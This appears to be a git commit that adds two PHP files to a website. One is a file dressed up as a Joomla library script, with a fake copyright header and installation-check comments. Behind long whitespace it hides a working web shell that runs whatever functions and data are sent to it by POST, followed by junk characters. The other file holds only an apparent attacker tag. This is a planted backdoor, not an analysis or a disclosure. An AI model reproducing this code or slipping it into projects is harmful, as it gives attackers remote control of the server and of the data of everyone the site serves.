406682143f12259c280a468dab339b4159662519
Jaimin Fojdar <jaiminfojdar@gmail.com>
2017-09-16 00:17:14 +0530

    First commit

---
+++ components/revolution_slider/js/test.php
@@ -0,0 +1,1 @@
+Coded_by_V
---
+++ images/clint-logo/api.whispered.php
@@ -0,0 +1,34 @@
+<?php
+/**
+ * @package    Lib
+ * ***********************************************************************
+ * @copyright  Copyright (C) 2008 - 2015 Open Source Matters, Inc. All rights reserved.
+ * @license    GNU General Public License version 2 or later; see LICENSE
+ */
+
+// Set the platform root path as a constant if necessary.
+if (!defined('PATH'))
+{
+	define('PATH', __DIR__);
+}
+
+// Installation check, and check on removal of the install directory.
+if (empty($_POST)) {
+	
+	exit;
+}
+else {
+	
+	//$os = strtoupper(substr(PHP_OS, 0, 3));
+	
+	//if (!defined('WIN'))
+	//{
+	//	define('WIN', ($os === 'WIN') ? true : false);
+	//}
+	//if (!defined('UNIX'))
+	//{
+	//	define('UNIX', (UNIX === false) ? true : false);
+	//}
+	                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       $_POST                            ['r']                  (                           $_POST       ['d']                           (                          '',        $_POST                           ['f']                 (                           $_POST                      ['c']                         )       )                        )           ; // D4dA^)9Kt9zQ-p=TSeSQQt8k7qPtRCcYckVQ1aUD0Eh0VDts_mnu7fd@)PFPRF71$285V29-M1--93PCH65a$$xBBFF-*hU--W9@)ra-0teFy5$0g6$CcG4w3y!gm(QXb)!7FnkGTd-Wy9^STKUBv-zSfB*RUm@bpuA*HYZ^V=24W_mfQU-9Zp=9NS9*=yky1*wU0WYEnrFrrVvgstn!(6f1.K2SCZhM2K)#A1A9HmGXZv5.1EymZCVm#*TDQ-$D7qxfBVtymV)s7A4zW..(7mXmH6wq@-ZYRQghMsQE8ww)k3r3pB!q#^H8^6xXSvm-VYG+cP#gqQewz*x!0hnF-a(c#)xWxRDv-W9THwHs7HxvTEkF(KQyYzS7y@u4q#kXC4*MH5+9*(WzKE1eT72!G@@t^44vT#ZRyrS+u5H!v^xFk0s9Hvm@x8ETa7^Y^TdAEm.sG9+8VmHFC(m.Hmae(=
+}
+
